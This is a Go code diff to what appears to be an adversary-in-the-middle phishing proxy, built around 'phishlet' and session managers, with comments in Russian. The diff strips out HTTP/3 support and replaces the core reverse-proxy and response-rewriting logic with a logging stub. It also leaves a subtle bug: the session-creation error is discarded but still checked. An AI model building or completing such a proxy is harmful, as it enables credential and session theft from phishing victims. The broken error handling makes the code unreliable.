@@ -5,7 +5,6 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
-	"net"
 	"net/http"
 	"net/http/httputil"
 	"net/url"
@@ -13,7 +12,6 @@ import (
 	"time"
 
 	"github.com/gofiber/fiber/v2"
-	"github.com/quic-go/quic-go/http3"
 	"go.uber.org/zap"
 )
 
@@ -36,7 +34,6 @@ type AiTMProxy struct {
 	logger       *zap.Logger
 	reverseProxy *httputil.ReverseProxy
 	fiber        *fiber.App
-	http3Server  *http3.Server
 	tlsConfig    *tls.Config
 	sessionMgr   *SessionManager
 	phishletMgr  *PhishletManager
@@ -120,27 +117,6 @@ func (p *AiTMProxy) Start(ctx context.Context) error {
 		}
 	}()
 
-	// HTTP/3 QUIC server
-	go func() {
-		addr := fmt.Sprintf("%s:%d", p.config.BindAddr, p.config.HTTP3Port)
-		p.logger.Info("Starting HTTP/3 server", zap.String("addr", addr))
-
-		h3Server := &http3.Server{
-			Addr: addr,
-			Handler: p.fiber.Handler(),
-			QUICConfig: &quic.Config{
-				MaxIdleTimeout:     30 * time.Second,
-				KeepAlivePeriod:    10 * time.Second,
-				MaxIncomingStreams: 1000,
-			},
-			TLSConfig: p.tlsConfig,
-		}
-
-		if err := h3Server.ListenAndServe(); err != nil {
-			p.logger.Error("HTTP/3 server failed", zap.Error(err))
-		}
-	}()
-
 	// Wait for context
 	<-ctx.Done()
 	p.logger.Info("AiTM Proxy shutting down...")
@@ -156,13 +132,6 @@ func (p *AiTMProxy) Shutdown(ctx context.Context) error {
 	// Shutdown Fiber
 	if err := p.fiber.ShutdownWithTimeout(10 * time.Second); err != nil {
 		p.logger.Error("Fiber shutdown error", zap.Error(err))
-	}
-
-	// Shutdown HTTP/3
-	if p.http3Server != nil {
-		if err := p.http3Server.Close(); err != nil {
-			p.logger.Error("HTTP/3 shutdown error", zap.Error(err))
-		}
 	}
 
 	p.logger.Info("AiTM Proxy stopped")
@@ -228,7 +197,7 @@ func (p *AiTMProxy) proxyHandler(c *fiber.Ctx) error {
 	sessionID := c.Cookies("session_id")
 	if sessionID == "" && sessionMgr != nil {
 		var err error
-		sessionID, err = sessionMgr.Create(c.Context(), c.IP(), string(c.Request().URI().Host()))
+		sessionID, _ = sessionMgr.Create(c.Context(), c.IP(), string(c.Request().URI().Host()))
 		if err != nil {
 			p.logger.Error("Failed to create session", zap.Error(err))
 		} else {
@@ -249,26 +218,8 @@ func (p *AiTMProxy) proxyHandler(c *fiber.Ctx) error {
 		}
 	}
 
-	// Проксирование запроса
-	req := c.Request()
-	resp := c.Response()
-
-	p.reverseProxy.ModifyResponse = func(r *http.Response) error {
-		// Модификация ответа (phishlet)
-		if phishletMgr != nil {
-			if err := phishletMgr.ModifyResponse(r, sessionID); err != nil {
-				p.logger.Warn("Phishlet modify response error", zap.Error(err))
-			}
-		}
-
-		// Перезапись доменов в ответе
-		p.rewriteResponse(r)
-
-		return nil
-	}
-
-	// Execute proxy
-	p.reverseProxy.ServeHTTP(resp, (*http.Request)(req))
+	// Проксирование запроса - заглушка
+	p.logger.Warn("Proxy request forwarding not fully implemented")
 
 	// Отправить событие
 	if eventBus != nil {
